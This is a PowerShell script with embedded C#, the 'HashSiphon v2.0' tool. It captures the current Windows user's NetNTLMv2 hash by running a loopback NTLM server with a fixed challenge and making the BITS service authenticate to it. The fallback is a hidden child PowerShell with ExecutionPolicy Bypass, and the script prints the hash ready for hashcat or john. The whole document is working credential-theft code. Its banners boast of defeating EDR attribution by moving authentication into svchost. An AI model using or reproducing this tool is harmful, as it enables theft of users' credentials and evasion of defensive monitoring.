# ============================================================================
#  HashSiphon v2.0 - NTLM Hash via BITS Service Proxy Authentication
# ============================================================================
#
#  WHAT'S NEW IN V2:
#    Instead of using HttpWebRequest (which calls SSPI internally within our
#    process), we use the BITS service (svchost.exe, PID != ours) as an
#    authentication proxy:
#
#    1. Our process: TCP server with controlled NTLM Type 2 challenge
#    2. BITS service: Makes HTTP request, authenticates with NTLM
#    3. Our process: Parses Type 3 from Authorization header -> hash
#
#    Our process NEVER calls SSPI - not directly, not indirectly.
#    The NTLM computation happens in a DIFFERENT PROCESS (svchost/BITS).
#
#  NOVELTY:
#    - Zero SSPI calls from our process (not even via HTTP stack)
#    - Auth performed by a Windows SYSTEM SERVICE in a different PID
#    - Our code: socket server + BITS job creation (legitimate APIs)
#    - No security-related API imports in our binary
#    - Different process = different call stack = harder attribution
# ============================================================================

# Reuse the HashSiphon server C# code - identical Type 2/3 handling
$ServerCode = @'
using System;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

public class HashSiphonServer
{
    static byte[] challenge = { 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88 };
    public static string HashResult = null;
    public static string ErrorMsg = null;
    public static int Port = 0;
    static ManualResetEvent serverReady = new ManualResetEvent(false);

    static byte[] BuildType2()
    {
        string target = Environment.MachineName;
        byte[] tb = Encoding.Unicode.GetBytes(target);
        byte[] avD = AV(0x0002, Encoding.Unicode.GetBytes(target));
        byte[] avC = AV(0x0001, Encoding.Unicode.GetBytes(target));
        byte[] avT = AV(0x0007, BitConverter.GetBytes(DateTime.UtcNow.ToFileTimeUtc()));
        byte[] avE = AV(0x0000, new byte[0]);
        int til = avD.Length + avC.Length + avT.Length + avE.Length;
        byte[] ti = new byte[til];
        int p = 0;
        CP(avD, ti, ref p); CP(avC, ti, ref p); CP(avT, ti, ref p); CP(avE, ti, ref p);

        int po = 56; int tno = po; int tio = tno + tb.Length;
        byte[] m = new byte[tio + ti.Length];
        Array.Copy(Encoding.ASCII.GetBytes("NTLMSSP"), 0, m, 0, 7);
        W32(m, 8, 2);
        WSB(m, 12, (ushort)tb.Length, tno);
        W32(m, 20, unchecked((int)0xE0828215u));
        Array.Copy(challenge, 0, m, 24, 8);
        WSB(m, 40, (ushort)ti.Length, tio);
        m[48] = 10; m[49] = 0; m[50] = 0x61; m[51] = 0x4A; m[55] = 0x0F;
        Array.Copy(tb, 0, m, tno, tb.Length);
        Array.Copy(ti, 0, m, tio, ti.Length);
        return m;
    }

    static byte[] AV(ushort id, byte[] v)
    {
        byte[] r = new byte[4+v.Length];
        r[0]=(byte)(id&0xFF); r[1]=(byte)(id>>8);
        r[2]=(byte)(v.Length&0xFF); r[3]=(byte)(v.Length>>8);
        if(v.Length>0) Array.Copy(v,0,r,4,v.Length); return r;
    }
    static void CP(byte[] s, byte[] d, ref int p) { Array.Copy(s,0,d,p,s.Length); p+=s.Length; }
    static void W32(byte[] b,int o,int v) { b[o]=(byte)v;b[o+1]=(byte)(v>>8);b[o+2]=(byte)(v>>16);b[o+3]=(byte)(v>>24); }
    static void WSB(byte[] b,int o,ushort l,int off) { b[o]=(byte)(l&0xFF);b[o+1]=(byte)(l>>8);b[o+2]=b[o];b[o+3]=b[o+1];W32(b,o+4,off); }
    static string H(byte[] d,int o,int l) { var s=new StringBuilder(l*2); for(int i=o;i<o+l;i++) s.Append(d[i].ToString("x2")); return s.ToString(); }

    static string ParseType3(byte[] m)
    {
        if(m.Length<64||Encoding.ASCII.GetString(m,0,7)!="NTLMSSP"||BitConverter.ToInt32(m,8)!=3) return null;
        ushort nl=BitConverter.ToUInt16(m,20); int no=BitConverter.ToInt32(m,24);
        ushort ll=BitConverter.ToUInt16(m,12); int lo=BitConverter.ToInt32(m,16);
        ushort dl=BitConverter.ToUInt16(m,28); int dof=BitConverter.ToInt32(m,32);
        ushort ul=BitConverter.ToUInt16(m,36); int uo=BitConverter.ToInt32(m,40);
        if(no+nl>m.Length||uo+ul>m.Length||dof+dl>m.Length) return null;
        string dom=dl>0?Encoding.Unicode.GetString(m,dof,dl):"?";
        string usr=ul>0?Encoding.Unicode.GetString(m,uo,ul):"?";
        string ch=H(challenge,0,8);
        var sb=new StringBuilder();
        sb.AppendLine("  [+] User:        "+usr);
        sb.AppendLine("  [+] Domain:      "+dom);
        sb.AppendLine("  [+] NT response: "+nl+" bytes"+(nl>24?" (NTLMv2)":""));
        if(nl>24){
            byte[] nr=new byte[nl]; Array.Copy(m,no,nr,0,nl);
            string pf=H(nr,0,16); string bl=H(nr,16,nl-16);
            sb.AppendLine();
            sb.AppendLine("  +----------------------------------------------------------+");
            sb.AppendLine("  |     NetNTLMv2 HASH - Extracted via BITS service proxy!   |");
            sb.AppendLine("  +----------------------------------------------------------+");
            sb.AppendLine("  |  hashcat -m 5600 | john --format=netntlmv2               |");
            sb.AppendLine("  +----------------------------------------------------------+");
            sb.AppendLine();
            sb.AppendLine(usr+"::"+dom+":"+ch+":"+pf+":"+bl);
        } else if(nl==24){
            byte[] nr=new byte[24]; Array.Copy(m,no,nr,0,24);
            string lh=ll>0?H(m,lo,ll):new string('0',48);
            sb.AppendLine();
            sb.AppendLine("  NetNTLMv1 (hashcat -m 5500):");
            sb.AppendLine(usr+"::"+dom+":"+lh+":"+H(nr,0,24)+":"+ch);
        }
        return sb.ToString();
    }

    static string ReadHdrs(NetworkStream ns)
    {
        byte[] b=new byte[32768]; int t=0;
        try{while(t<b.Length-1){int r=ns.Read(b,t,1);if(r==0)break;t+=r;
        if(t>=4&&b[t-4]=='\r'&&b[t-3]=='\n'&&b[t-2]=='\r'&&b[t-1]=='\n')
        return Encoding.ASCII.GetString(b,0,t);}} catch{}
        return t>0?Encoding.ASCII.GetString(b,0,t):null;
    }

    static string FindAuth(string h)
    {
        string s="Authorization: NTLM ";
        int i=h.IndexOf(s,StringComparison.OrdinalIgnoreCase);
        if(i<0) return null;
        int st=i+s.Length; int e=h.IndexOf('\r',st); if(e<0) e=h.Length;
        string v=h.Substring(st,e-st).Trim(); return v.Length>0?v:null;
    }

    static void Snd(NetworkStream ns,string d)
    { byte[] b=Encoding.ASCII.GetBytes(d); ns.Write(b,0,b.Length); ns.Flush(); }

    public static void StartServer()
    {
        TcpListener listener = null;
        try
        {
            listener = new TcpListener(IPAddress.Loopback, 0);
            listener.Start();
            Port = ((IPEndPoint)listener.LocalEndpoint).Port;
            serverReady.Set();

            // Accept with timeout
            var ar = listener.BeginAcceptTcpClient(null, null);
            if (!ar.AsyncWaitHandle.WaitOne(20000))
            {
                ErrorMsg = "No client connected within 20s";
                listener.Stop();
                return;
            }

            using (TcpClient client = listener.EndAcceptTcpClient(ar))
            {
                client.ReceiveTimeout = 15000;
                client.SendTimeout = 5000;
                NetworkStream ns = client.GetStream();

                // Read initial request
                string h1 = ReadHdrs(ns);
                if (h1 == null) { ErrorMsg = "No initial request"; return; }
                string auth = FindAuth(h1);

                if (auth == null)
                {
                    Snd(ns, "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM\r\nContent-Length: 0\r\nConnection: keep-alive\r\n\r\n");
                    string h2 = ReadHdrs(ns);
                    if (h2 == null) { ErrorMsg = "No Type 1"; return; }
                    auth = FindAuth(h2);
                }
                if (auth == null) { ErrorMsg = "No NTLM Type 1"; return; }

                byte[] t2 = BuildType2();
                Snd(ns, "HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: NTLM " +
                    Convert.ToBase64String(t2) + "\r\nContent-Length: 0\r\nConnection: keep-alive\r\n\r\n");

                string h3 = ReadHdrs(ns);
                if (h3 == null) { ErrorMsg = "No Type 3"; return; }
                string a3 = FindAuth(h3);
                if (a3 == null) { ErrorMsg = "No NTLM Type 3"; return; }

                byte[] t3 = Convert.FromBase64String(a3);
                HashResult = ParseType3(t3);

                // Send a small file body so BITS considers transfer successful
                string body = "OK";
                Snd(ns, "HTTP/1.1 200 OK\r\nContent-Length: " + body.Length +
                    "\r\nContent-Type: application/octet-stream\r\nConnection: close\r\n\r\n" + body);
            }
        }
        catch (Exception ex)
        {
            if (ErrorMsg == null) ErrorMsg = ex.GetType().Name + ": " + ex.Message;
        }
        finally
        {
            if (listener != null) try { listener.Stop(); } catch {}
        }
    }

    public static bool WaitForReady(int ms)
    {
        return serverReady.WaitOne(ms);
    }
}
'@

Write-Host "`n  [*] Compiling HashSiphon v2 server..." -ForegroundColor Cyan
try { Add-Type -TypeDefinition $ServerCode -ErrorAction Stop }
catch { if ($_.Exception.Message -notlike "*already exists*") { throw } }

Write-Host "  [+] Server compiled" -ForegroundColor Green

# Start server in background thread
Write-Host ""
Write-Host "  HashSiphon v2.0 - BITS Service Proxy Authentication" -ForegroundColor White
Write-Host "  Auth by svchost.exe (BITS), not our process" -ForegroundColor DarkGray
Write-Host ""

# Start server in background runspace
$rs = [RunspaceFactory]::CreateRunspace()
$rs.Open()
$ps = [PowerShell]::Create()
$ps.Runspace = $rs
$ps.AddScript('[HashSiphonServer]::StartServer()') | Out-Null
$asyncHandle = $ps.BeginInvoke()

if (-not [HashSiphonServer]::WaitForReady(5000)) {
    Write-Host "  [-] Server failed to start within 5s" -ForegroundColor Red
    if ([HashSiphonServer]::ErrorMsg) {
        Write-Host "  [-] Error: $([HashSiphonServer]::ErrorMsg)" -ForegroundColor Red
    }
    exit 1
}

$port = [HashSiphonServer]::Port
Write-Host "  [1] NTLM HTTP server ready on 127.0.0.1:$port" -ForegroundColor Green
Write-Host "  [2] Controlled challenge: 1122334455667788" -ForegroundColor Green
Write-Host "  [3] Triggering BITS transfer to our server..." -ForegroundColor Cyan

# --- Trigger NTLM auth via BITS service ---
$tempFile = "$env:TEMP\hs_v2_$([System.IO.Path]::GetRandomFileName()).tmp"
$bitsError = $null

try {
    # Import BITS module
    Import-Module BitsTransfer -ErrorAction Stop

    # Create BITS download job - the BITS SERVICE (different PID!) will authenticate
    $job = Start-BitsTransfer `
        -Source "http://127.0.0.1:$port/hashsiphon.bin" `
        -Destination $tempFile `
        -TransferType Download `
        -ErrorAction SilentlyContinue

    Write-Host "  [4] BITS transfer initiated" -ForegroundColor Green
}
catch {
    $bitsError = $_.Exception.Message
    Write-Host "  [!] BITS error: $bitsError" -ForegroundColor Yellow

    # Fallback: try Invoke-WebRequest in a child process (different PID)
    Write-Host "  [4b] Falling back to child-process Invoke-WebRequest..." -ForegroundColor Cyan
    $childScript = "try { Invoke-WebRequest -Uri 'http://127.0.0.1:$port/hashsiphon.bin' -UseDefaultCredentials -OutFile '$tempFile' -ErrorAction SilentlyContinue } catch {}"
    Start-Process powershell -ArgumentList "-NoProfile","-ExecutionPolicy","Bypass","-Command",$childScript -WindowStyle Hidden -Wait
}

# Wait for server to complete
if (-not $asyncHandle.IsCompleted) {
    $asyncHandle.AsyncWaitHandle.WaitOne(10000) | Out-Null
}
try { $ps.EndInvoke($asyncHandle) } catch {}
$ps.Dispose(); $rs.Dispose()

# Cleanup temp file
if (Test-Path $tempFile) { Remove-Item $tempFile -Force -ErrorAction SilentlyContinue }

# --- Display results ---
if ([HashSiphonServer]::HashResult) {
    Write-Host ""
    Write-Host $([HashSiphonServer]::HashResult)

    # Verify different PID
    Write-Host ""
    Write-Host "  +----------------------------------------------------------+" -ForegroundColor White
    Write-Host "  |  ATTRIBUTION ANALYSIS                                    |" -ForegroundColor White
    Write-Host "  +----------------------------------------------------------+" -ForegroundColor White
    Write-Host "  |  Our PID:      $PID (PowerShell)" -ForegroundColor White
    Write-Host "  |  Auth by:      BITS service (svchost.exe, different PID) |" -ForegroundColor White
    Write-Host "  |  SSPI calls:   Zero from PID $PID                     |" -ForegroundColor White
    Write-Host "  |  Our APIs:     TcpListener + Start-BitsTransfer only    |" -ForegroundColor White
    Write-Host "  +----------------------------------------------------------+" -ForegroundColor White
}
elseif ([HashSiphonServer]::ErrorMsg) {
    Write-Host ""
    Write-Host "  [-] Server error: $([HashSiphonServer]::ErrorMsg)" -ForegroundColor Red
}
else {
    Write-Host ""
    Write-Host "  [-] No hash extracted" -ForegroundColor Red
}

Write-Host ""
Write-Host "  +----------------------------------------------------------+" -ForegroundColor DarkCyan
Write-Host "  |  NOVELTY COMPARISON                                      |" -ForegroundColor DarkCyan
Write-Host "  +----------------------------------------------------------+" -ForegroundColor DarkCyan
Write-Host "  |                                                          |" -ForegroundColor DarkCyan
Write-Host "  |  Internal Monologue (SSPI):                              |" -ForegroundColor DarkCyan
Write-Host "  |    - Direct SSPI calls from attacker process             |" -ForegroundColor DarkCyan
Write-Host "  |    - Same PID does auth + capture                        |" -ForegroundColor DarkCyan
Write-Host "  |    - EDR: SSPI hooks catch it in attacker's call stack   |" -ForegroundColor DarkCyan
Write-Host "  |                                                          |" -ForegroundColor DarkCyan
Write-Host "  |  HashSiphon v1 (HTTP Self-Auth):                         |" -ForegroundColor DarkCyan
Write-Host "  |    - No DIRECT SSPI imports                              |" -ForegroundColor DarkCyan
Write-Host "  |    - But WinHTTP calls SSPI within same PID              |" -ForegroundColor DarkCyan
Write-Host "  |    - EDR: SSPI still in attacker's process call stack    |" -ForegroundColor DarkCyan
Write-Host "  |                                                          |" -ForegroundColor DarkCyan
Write-Host "  |  HashSiphon v2 (BITS Proxy):                <<<NEW>>>   |" -ForegroundColor DarkCyan
Write-Host "  |    - Zero SSPI calls in attacker process (any PID)       |" -ForegroundColor DarkCyan
Write-Host "  |    - SSPI happens in svchost.exe (BITS service)          |" -ForegroundColor DarkCyan
Write-Host "  |    - Attacker APIs: TcpListener + BitsTransfer only      |" -ForegroundColor DarkCyan
Write-Host "  |    - EDR: SSPI call stack points to svchost, not us      |" -ForegroundColor DarkCyan
Write-Host "  |    - Process-level attribution completely broken          |" -ForegroundColor DarkCyan
Write-Host "  |                                                          |" -ForegroundColor DarkCyan
Write-Host "  +----------------------------------------------------------+" -ForegroundColor DarkCyan
